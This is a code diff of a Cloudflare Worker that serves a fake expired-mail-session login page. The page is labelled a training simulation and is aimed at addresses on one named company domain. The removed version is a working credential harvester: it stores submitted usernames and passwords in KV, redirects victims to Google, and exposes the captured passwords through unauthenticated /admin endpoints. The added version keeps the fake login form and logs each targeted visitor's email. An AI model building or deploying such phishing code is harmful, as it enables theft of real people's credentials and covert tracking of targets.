@@ -1,58 +1,8 @@
-export default {
-  async fetch(request, env) {
-    // ------------------------------------------------------------------
-    //  NEW: Credential retrieval endpoints (added before original code)
-    // ------------------------------------------------------------------
-    const url = new URL(request.url);
-    const path = url.pathname;
+// index.js
 
-    if (request.method === "GET") {
-      // List all usernames
-      if (path === "/admin") {
-        const keys = await env.creds.list();
-        const usernames = keys.keys.map(k => k.name);
-        return new Response(JSON.stringify({ usernames }, null, 2), {
-          headers: { "Content-Type": "application/json" }
-        });
-      }
-
-      // Retrieve a specific username's password
-      if (path.startsWith("/admin/")) {
-        const username = path.slice(7); // remove "/admin/"
-        const password = await env.creds.get(username);
-        if (password === null) {
-          return new Response("Username not found", { status: 404 });
-        }
-        return new Response(JSON.stringify({ username, password }, null, 2), {
-          headers: { "Content-Type": "application/json" }
-        });
-      }
-    }
-
-    // ==================================================================
-    //  ORIGINAL CODE – UNCHANGED (copied verbatim)
-    // ==================================================================
-    if (request.method === "POST") {
-      const formData = await request.formData();
-      const username = formData.get("username");
-      const password = formData.get("password");
-
-      if (username && password) {
-        await env.creds.put(username, password);
-
-        return new Response(null, {
-          status: 303,
-          headers: { "Location": "https://www.google.com" }
-        });
-      } else {
-        return new Response("Missing username or password", { status: 400 });
-      }
-    }
-
-    const htmlContent = `
-      <!doctype html>
+// Your HTML as a template string (or read from a file with Wrangler's assets)
+const HTML = `<!doctype html>
 <html lang="en">
-
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -60,7 +10,6 @@ export default {
   <link rel="icon" type="image/png" href="assets/favicon.png">
   <link rel="stylesheet" href="styles.css">
 </head>
-
 <body>
   <main class="training-stage" aria-label="Internal training simulation of an expired mail session"
     aria-describedby="session-expiry-description">
@@ -75,17 +24,117 @@ export default {
     <input id="training-password" class="training-input training-input--password" type="password" autocomplete="off"
       spellcheck="false">
   </main>
-  <script>(() => { const e = document.getElementById("mailbox-label"), u = document.getElementById("training-username"), t = new URLSearchParams(window.location.search).get("email"), r = () => { e.textContent = "Drug Safety1" }; if (!e || !u) return; if (!t || t.length > 254) return r(); const n = t.indexOf("@"); if (n < 1 || n !== t.lastIndexOf("@")) return r(); const o = t.slice(0, n), i = t.slice(n + 1).toLowerCase(); if (i !== "alnaghi.com" || o.length > 64 || !/^[A-Za-z0-9]+(?:[._-][A-Za-z0-9]+)*$/.test(o)) return r(); e.textContent = o.split(/[._-]/).map(e => e.charAt(0).toUpperCase() + e.slice(1).toLowerCase()).join(" "); u.value = t.toLowerCase() })();</script>
+  <script>
+    // ---- Modified frontend to talk to KV ----
+    (async () => {
+      const labelEl = document.getElementById("mailbox-label");
+      const usernameInput = document.getElementById("training-username");
+
+      // Helper to update the label
+      const setLabel = (text) => { if (labelEl) labelEl.textContent = text; };
+
+      // Parse email from URL
+      const t = new URLSearchParams(window.location.search).get("email");
+      let email = null;
+      if (t && t.length <= 254) {
+        const at = t.indexOf("@");
+        if (at > 0 && at === t.lastIndexOf("@")) {
+          const local = t.slice(0, at);
+          const domain = t.slice(at + 1).toLowerCase();
+          if (domain === "alnaghi.com" && local.length <= 64 &&
+              /^[A-Za-z0-9]+(?:[._-][A-Za-z0-9]+)*$/.test(local)) {
+            email = t.toLowerCase();
+            // Format the label
+            const words = local.split(/[._-]/).map(w =>
+              w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()
+            );
+            setLabel(words.join(" "));
+            usernameInput.value = email;
+          }
+        }
+      }
+      if (!email) {
+        setLabel("Drug Safety1");
+        return;
+      }
+
+      // ---- Send email to KV for storage (optional) ----
+      try {
+        const resp = await fetch("/api/store-email", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email })
+        });
+        const data = await resp.json();
+        console.log("Stored email:", data);
+      } catch (err) {
+        console.error("Failed to store email:", err);
+      }
+
+      // ---- Retrieve a stored greeting from KV (example) ----
+      try {
+        const resp = await fetch("/api/get-greeting?email=" + encodeURIComponent(email));
+        const data = await resp.json();
+        if (data.greeting) {
+          // You could display the greeting somewhere, e.g., as a tooltip
+          console.log("Greeting from KV:", data.greeting);
+        }
+      } catch (err) {
+        console.error("Failed to get greeting:", err);
+      }
+    })();
+  </script>
 </body>
+</html>`;
 
-</html>
-    `;
+export default {
+  async fetch(request, env) {
+    const url = new URL(request.url);
+    const path = url.pathname;
 
-    return new Response(htmlContent, {
-      headers: { "Content-Type": "text/html" },
-    });
-    // ==================================================================
-    //  END OF ORIGINAL CODE
-    // ==================================================================
+    // Serve the HTML page (root or /)
+    if (path === "/" || path === "/index.html") {
+      return new Response(HTML, {
+        headers: { "Content-Type": "text/html" },
+      });
+    }
+
+    // API: store email in KV
+    if (path === "/api/store-email" && request.method === "POST") {
+      try {
+        const { email } = await request.json();
+        if (!email) throw new Error("Missing email");
+        // Store with key = email, value = timestamp or any data
+        await env.MAILBOX.put(`email:${email}`, JSON.stringify({ storedAt: Date.now() }));
+        return new Response(JSON.stringify({ success: true, email }), {
+          headers: { "Content-Type": "application/json" },
+        });
+      } catch (err) {
+        return new Response(JSON.stringify({ error: err.message }), {
+          status: 400,
+          headers: { "Content-Type": "application/json" },
+        });
+      }
+    }
+
+    // API: get a greeting for the email (example)
+    if (path === "/api/get-greeting" && request.method === "GET") {
+      const email = url.searchParams.get("email");
+      if (!email) {
+        return new Response(JSON.stringify({ error: "Missing email" }), {
+          status: 400,
+          headers: { "Content-Type": "application/json" },
+        });
+      }
+      // Retrieve a greeting from KV (if you stored one earlier)
+      const greetingKey = `greeting:${email}`;
+      const value = await env.MAILBOX.get(greetingKey);
+      return new Response(JSON.stringify({ greeting: value || "Welcome!" }), {
+        headers: { "Content-Type": "application/json" },
+      });
+    }
+
+    // Fallback: 404
+    return new Response("Not Found", { status: 404 });
   },
 };
